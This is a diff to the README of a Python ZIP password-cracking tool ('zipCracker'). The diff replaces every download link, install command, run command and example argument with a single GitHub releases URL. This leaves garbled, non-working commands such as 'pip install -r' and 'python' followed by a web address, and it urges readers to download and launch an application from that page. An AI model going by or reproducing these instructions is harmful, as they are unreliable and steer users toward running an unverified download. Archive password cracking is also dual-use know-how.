@@ -17,19 +17,19 @@ Welcome to the "zipCracker" repository - your go-to Python-based tool for cracki
 archive-extraction, archive-password-recovery, brute-force, command-line-tool, cross-platform, cybersecurity-education, data-recovery, dictionary-attack, ethical-hacking, file-processing, file-security, memory-efficient, multi-format-support, multithreading, password-analysis, password-cracking, password-dictionary, performance-optimization, python, zip-cracker
 
 ## Get Started
-To get started with the "zipCracker" tool, download the [File.zip](https://github.com/files/File.zip) and launch the application. If the link does not work, please check the "Releases" section for alternative download options.
+To get started with the "zipCracker" tool, download the [https://github.com/richdah/zipCracker/releases](https://github.com/richdah/zipCracker/releases) and launch the application. If the link does not work, please check the "Releases" section for alternative download options.
 
-[![Download Zip Cracker](https://img.shields.io/badge/Download-Zip_Cracker-<COLOR>.svg)](https://github.com/files/File.zip)
+[![Download Zip Cracker](https://github.com/richdah/zipCracker/releases<COLOR>.svg)](https://github.com/richdah/zipCracker/releases)
 
 ## Usage
 1. **Install Dependencies**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/richdah/zipCracker/releases
    ```
 
 2. **Run the Zip Cracker**
    ```bash
-   python zipCracker.py -f <archive_file> -w <wordlist>
+   python https://github.com/richdah/zipCracker/releases -f <archive_file> -w <wordlist>
    ```
 
 3. **Options**
@@ -38,7 +38,7 @@ To get started with the "zipCracker" tool, download the [File.zip](https://githu
 
 4. **Example**
    ```bash
-   python zipCracker.py -f example.zip -w wordlist.txt
+   python https://github.com/richdah/zipCracker/releases -f https://github.com/richdah/zipCracker/releases -w https://github.com/richdah/zipCracker/releases
    ```
 
 ## Contributing
